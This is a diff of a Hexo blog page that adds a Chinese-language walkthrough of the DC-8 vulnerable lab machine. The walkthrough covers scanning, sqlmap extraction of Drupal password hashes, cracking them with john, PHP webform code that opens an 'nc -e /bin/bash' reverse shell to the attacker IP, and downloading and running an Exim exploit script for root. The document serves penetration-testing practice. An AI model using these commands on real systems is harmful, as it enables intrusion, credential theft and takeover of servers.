@@ -10,7 +10,7 @@
     
     
     
-    <title>about | Hexo</title>
+    <title>DC8-Try | Hexo</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -161,23 +161,112 @@
     <div class="cube-content">
         <div class="cube-left">
             <div class="cube-article">
-    <h1 class="title">about</h1>
+    <h1 class="title">DC8-Try</h1>
         
-                <div class="cube-article-header">
-                    <div class="cube-article-date page">
-                        <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-                        <!-- moment.js对象 -->
-                        2024-04-16
-                    </div>
+            <div class="cube-article-header">
+                <div class="cube-article-date">
+                    <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                    <!-- moment.js对象 -->
+                    2024-07-30
                 </div>
-                
+                <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+</div>
+            </div>
+            
                     <div class="cube-article-content cube-markdown">
                         
-                            
+                            <h1 id="1下载"><a href="#1下载" class="headerlink" title="1下载"></a>1下载</h1><p><a target="_blank" rel="noopener" href="https://www.five86.com/downloads/DC-8.zip">https://www.five86.com/downloads/DC-8.zip</a></p>
+<span id="more"></span>
+
+<h1 id="2信息收集"><a href="#2信息收集" class="headerlink" title="2信息收集"></a>2信息收集</h1><p>(1)ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p>137</p>
+<p>(2)端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- -A 192.168.49.137</span><br></pre></td></tr></table></figure>
+
+<p>输出详细信息</p>
+<p><img src="/2024/07/30/DC8-Try/1.png" alt="DC8-Try"></p>
+<p>22 80  Drupal 7 </p>
+<p>当然</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用插件</span><br><span class="line">或 whatweb url</span><br><span class="line">也可以获得</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个参数的目录扫面可以用很快</span><br><span class="line">dirsearch -u http://192.168.49.137 -e* -x 403 --random-agent</span><br></pre></td></tr></table></figure>
+
+<p>-e*是所有扩展名 -x 403 不展示403的  –random-agent 用随机字符当agent</p>
+<p>随便点一下 看到网站2019 9.3 </p>
+<p><img src="/2024/07/30/DC8-Try/2.png" alt="DC8-Try"></p>
+<p>知道版本 7.67</p>
+<p><img src="/2024/07/30/DC8-Try/3.png" alt="DC8-Try"></p>
+<p>没漏洞，历史遗留</p>
+<p><img src="/2024/07/30/DC8-Try/4.png" alt="DC8-Try"></p>
+<p>看看有没有sql漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.49.137/?nid=2 --dbs</span><br><span class="line">sqlmap -u http://192.168.49.137/?nid=2 -Dd7db --tables</span><br><span class="line"># sqlmap -u http://192.168.49.137/?nid=2 -Dd7db -T users --columns</span><br><span class="line">sqlmap -u http://192.168.49.137/?nid=2 -Dd7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/DC8-Try/5.png" alt="DC8-Try"></p>
+<p>admin  john两个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#x27; &gt;&gt; &quot;pp.txt&quot;</span><br><span class="line">echo &#x27;$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z&#x27; &gt;&gt; &quot;pp.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>前面用’’后面用””</p>
+<p>用hash专门破解的字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john pp.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/DC8-Try/6.png" alt="DC8-Try"></p>
+<p>出来了</p>
+<p>turtle</p>
+<p>扫出来user&#x2F;login</p>
+<p>登录</p>
+<p>发现这个是john的</p>
+<p>点contack us-》webform-》form setting</p>
+<p>写反弹shell，改为php code</p>
+<p>记得前面加个 <p>adad</p>  不然反弹不了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@system(&quot;nc -e /bin/bash 192.168.49.129 8888&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">这个@加不加无所谓</span><br><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@exec(&quot;nc -e /bin/bash 192.168.49.129 8888&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">也可以用exec也可以，@同理</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  -lvvnp 8888</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/30/DC8-Try/7.png" alt="DC8-Try"></p>
+<p>随便填一下，提交反弹</p>
+<p><img src="/2024/07/30/DC8-Try/8.png" alt="DC8-Try"></p>
+<p>交互</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 2&lt;/dev/null</span><br><span class="line">看到 exim4</span><br><span class="line">exim4 --version</span><br><span class="line">4.89</span><br><span class="line">searchsploit exim 4 </span><br><span class="line">跟dc4那个一样</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/46996.sh ./</span><br><span class="line">python3 -m http.server 8888</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.49.129:8888/46996.sh</span><br><span class="line">chmod +x 46996.sh    或 chmod 777 46996.sh </span><br></pre></td></tr></table></figure>
+
+<p>这个用.&#x2F;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./46996.sh -m netcat</span><br></pre></td></tr></table></figure>
+
+<p>用netcat模式或模块</p>
+<p><img src="/2024/07/30/DC8-Try/9.png" alt="DC8-Try"></p>
+<p>但是我那个 dc4 直接 .&#x2F;46996.sh获得root</p>
+<p>这个  .&#x2F;46996.sh -m netcat 才可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.49.137 -X.php  </span><br><span class="line">-X后面跟扩展名   反正这几个都用用</span><br></pre></td></tr></table></figure>
+
+
                     </div>
 </div>
 
+    <div class="cube-article-nav">
+        <ul>
+            
+                    
+                        <li class="next">
+                            <a href="/2024/07/29/DC7-Try/">
+                                DC7-Try
+                                    <i class="cube-icon cube-next" aria-hidden="true"></i>
+                            </a>
+                        </li>
+                        
+        </ul>
+    </div>
+    
         
+            <!-- TODO 根据theme.comment的内容进行入口选择 -->
+
+                
         </div>
         <div class="cube-right">
             
